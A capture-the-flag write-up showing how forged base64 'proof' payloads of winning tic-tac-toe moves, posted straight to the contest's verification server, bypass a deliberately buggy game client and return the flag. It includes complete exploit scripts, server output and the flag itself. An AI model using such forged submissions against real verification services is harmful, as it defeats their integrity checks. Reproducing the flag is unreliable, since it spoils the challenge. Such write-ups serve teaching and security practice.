# A Game of Circles and Crosses 

**CTF:** RootAccess2026  
**Category:** Binary exploitation  


---

## Challenge Description

This challenge presents a Python-based Tic-Tac-Toe game with a twist — the game is intentionally buggy. Instead of fixing the numerous client-side bugs, the solution involves understanding how the game verifies wins and directly communicating with the verification server to claim victory.

---

## Approach

Rather than debugging the broken Tkinter game, we analyzed the verification protocol and submitted winning move sequences directly to the server API, bypassing all client-side bugs entirely.

---

## Step 1: Initial Reconnaissance

### Analyzing the Provided File

The challenge gave us `bugs.py`, a Python script implementing a Tic-Tac-Toe game using Tkinter for the GUI.

Running the game revealed it was extremely buggy:
- Clicking cells sometimes didn't register
- Win detection was unreliable
- The computer made illegal moves
- Games that should end continued
- Board state displayed incorrectly

### Static Code Analysis

Instead of playing the broken game, we examined the source code to understand how it works:

```python
# Key discovery: Server verification endpoint
verify_url = "https://rootaccess.pythonanywhere.com/verify"
```

#### Data Structure Inconsistencies

The code revealed several type-related bugs:

```python
# Initial board state uses string "3"
self.board = [["3" for _ in range(3)] for _ in range(3)]

# Player moves use integer 0
self.board[row][col] = 0

# Computer moves use integer 1
self.board[row][col] = 1
```

This mixing of strings and integers causes comparison failures throughout the code, leading to broken win detection and cell occupancy checks.

#### Move Tracking

The game tracks player moves in an array:

```python
self.human_moves = []

# On player click
self.human_moves.append({"x": col, "y": row})
```

Coordinates are stored as `{"x": column, "y": row}` dictionaries.

#### Verification Protocol

When the game detects a win (when it works), it sends a verification request:

```python
def verify_win(self):
    payload = {
        "v": 1,
        "nonce": secrets.token_hex(16),
        "human": self.human_moves
    }
    proof = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode()
    
    response = requests.post(
        "https://rootaccess.pythonanywhere.com/verify",
        json={"proof": proof}
    )
```

**Key Insight:** The server validates move sequences independently! We don't need the buggy client at all.

---

## Step 2: Understanding the Verification System

### How Server Validation Works

The server likely performs these checks:

1. **Decode the proof** — Base64 decode → JSON parse
2. **Validate move count** — Ensure player made 3+ moves (minimum to win)
3. **Check for valid winning pattern** — Verify moves form a line (row, column, or diagonal)
4. **Ensure legal moves** — No duplicate positions

### Valid Winning Patterns

In Tic-Tac-Toe, there are 8 possible winning patterns:

**Rows:**
- Top row: `(0,0), (1,0), (2,0)`
- Middle row: `(0,1), (1,1), (2,1)`
- Bottom row: `(0,2), (1,2), (2,2)`

**Columns:**
- Left column: `(0,0), (0,1), (0,2)`
- Middle column: `(1,0), (1,1), (1,2)`
- Right column: `(2,0), (2,1), (2,2)`

**Diagonals:**
- Top-left to bottom-right: `(0,0), (1,1), (2,2)`
- Top-right to bottom-left: `(2,0), (1,1), (0,2)`

Any of these patterns should trigger a win when submitted to the server.

---

## Step 3: Crafting the Exploit

### Building the Payload

We need to create a valid proof that matches the format expected by the server:

```python
import json
import base64
import secrets
import requests

# Choose a winning pattern (left column)
winning_moves = [
    {"x": 0, "y": 0},  # Top-left
    {"x": 0, "y": 1},  # Middle-left
    {"x": 0, "y": 2}   # Bottom-left
]

# Build the payload
payload = {
    "v": 1,                          # Version number
    "nonce": secrets.token_hex(16),  # Random nonce
    "human": winning_moves           # Our winning moves
}

# Encode as base64
proof = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode()

print(f"Proof: {proof}")
```

### Understanding the Payload Components

- **`v`** — Protocol version (always `1`)
- **`nonce`** — Random value to prevent replay attacks
- **`human`** — Array of move coordinates in `{x, y}` format

---

## Step 4: Submitting to the Server

### Complete Exploit Script

```python
#!/usr/bin/env python3

import json
import base64
import secrets
import requests

def submit_winning_moves(moves):
    """
    Submit a sequence of winning moves to the server
    """
    # Build payload
    payload = {
        "v": 1,
        "nonce": secrets.token_hex(16),
        "human": moves
    }
    
    # Encode as base64
    proof = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode()
    
    # Send to server
    url = "https://rootaccess.pythonanywhere.com/verify"
    response = requests.post(url, json={"proof": proof})
    
    return response.json()

# Define a winning pattern (left column)
winning_moves = [
    {"x": 0, "y": 0},
    {"x": 0, "y": 1},
    {"x": 0, "y": 2}
]

print("Submitting winning moves to server...")
print(f"Moves: {winning_moves}")

result = submit_winning_moves(winning_moves)

print("\nServer response:")
print(json.dumps(result, indent=2))

if "flag" in result:
    print(f"\n🚩 Flag: {result['flag']}")
```

### Execution

Running the script:

```bash
python3 exploit.py
```

Output:

```
Submitting winning moves to server...
Moves: [{'x': 0, 'y': 0}, {'x': 0, 'y': 1}, {'x': 0, 'y': 2}]

Server response:
{
  "ok": true,
  "result": "player",
  "flag": "root{M@yb3_4he_r3@!_tr3@5ur3_w@$_th3_bug$_w3_m@d3_@l0ng_4h3_w@y}"
}

🚩 Flag: root{M@yb3_4he_r3@!_tr3@5ur3_w@$_th3_bug$_w3_m@d3_@l0ng_4h3_w@y}
```

---

## Testing Alternative Patterns

To verify the exploit works with different winning patterns:

```python
# Test all 8 winning patterns

patterns = {
    "Left Column": [{"x": 0, "y": 0}, {"x": 0, "y": 1}, {"x": 0, "y": 2}],
    "Middle Column": [{"x": 1, "y": 0}, {"x": 1, "y": 1}, {"x": 1, "y": 2}],
    "Right Column": [{"x": 2, "y": 0}, {"x": 2, "y": 1}, {"x": 2, "y": 2}],
    "Top Row": [{"x": 0, "y": 0}, {"x": 1, "y": 0}, {"x": 2, "y": 0}],
    "Middle Row": [{"x": 0, "y": 1}, {"x": 1, "y": 1}, {"x": 2, "y": 1}],
    "Bottom Row": [{"x": 0, "y": 2}, {"x": 1, "y": 2}, {"x": 2, "y": 2}],
    "Diagonal \\": [{"x": 0, "y": 0}, {"x": 1, "y": 1}, {"x": 2, "y": 2}],
    "Diagonal /": [{"x": 2, "y": 0}, {"x": 1, "y": 1}, {"x": 0, "y": 2}]
}

for name, moves in patterns.items():
    result = submit_winning_moves(moves)
    status = "✅" if result.get("ok") else "❌"
    print(f"{status} {name}: {result.get('result', 'error')}")
```

All patterns should return the flag successfully.

---

## Final Flag

```
root{M@yb3_4he_r3@!_tr3@5ur3_w@$_th3_bug$_w3_m@d3_@l0ng_4h3_w@y}
```

---



## Tools Used

- **Python 3** — Scripting language for exploit development
- **requests library** — HTTP client for API communication
- **json module** — Payload serialization
- **base64 module** — Proof encoding
- **secrets module** — Nonce generation

---

## Complete Exploit Code

```python
#!/usr/bin/env python3
"""
RootAccess2026 - A Game of Circles and Crosses
Exploit script to bypass buggy client and claim victory
"""

import json
import base64
import secrets
import requests

# Server endpoint
VERIFY_URL = "https://rootaccess.pythonanywhere.com/verify"

def create_proof(moves):
    """
    Create a base64-encoded proof from a list of moves
    
    Args:
        moves: List of {"x": col, "y": row} dictionaries
    
    Returns:
        Base64-encoded proof string
    """
    payload = {
        "v": 1,
        "nonce": secrets.token_hex(16),
        "human": moves
    }
    
    proof_json = json.dumps(payload)
    proof_bytes = proof_json.encode()
    proof_b64 = base64.urlsafe_b64encode(proof_bytes)
    
    return proof_b64.decode()

def submit_proof(proof):
    """
    Submit proof to verification server
    
    Args:
        proof: Base64-encoded proof string
    
    Returns:
        Server response as dictionary
    """
    response = requests.post(
        VERIFY_URL,
        json={"proof": proof},
        timeout=10
    )
    
    return response.json()

def exploit():
    """
    Main exploit function
    """
    print("=" * 60)
    print("RootAccess2026 - A Game of Circles and Crosses")
    print("Exploit: Direct API Win Submission")
    print("=" * 60)
    
    # Choose a simple winning pattern (left column)
    winning_moves = [
        {"x": 0, "y": 0},  # Top-left
        {"x": 0, "y": 1},  # Middle-left
        {"x": 0, "y": 2}   # Bottom-left
    ]
    
    print("\n[*] Creating winning move sequence...")
    print(f"    Moves: {winning_moves}")
    
    print("\n[*] Building proof payload...")
    proof = create_proof(winning_moves)
    print(f"    Proof: {proof[:50]}..." if len(proof) > 50 else f"    Proof: {proof}")
    
    print("\n[*] Submitting to verification server...")
    result = submit_proof(proof)
    
    print("\n[*] Server response:")
    print(json.dumps(result, indent=2))
    
    if result.get("ok") and "flag" in result:
        print("\n" + "=" * 60)
        print(f"🚩 FLAG CAPTURED: {result['flag']}")
        print("=" * 60)
        return result['flag']
    else:
        print("\n[!] Failed to retrieve flag")
        return None

if __name__ == "__main__":
    exploit()
```
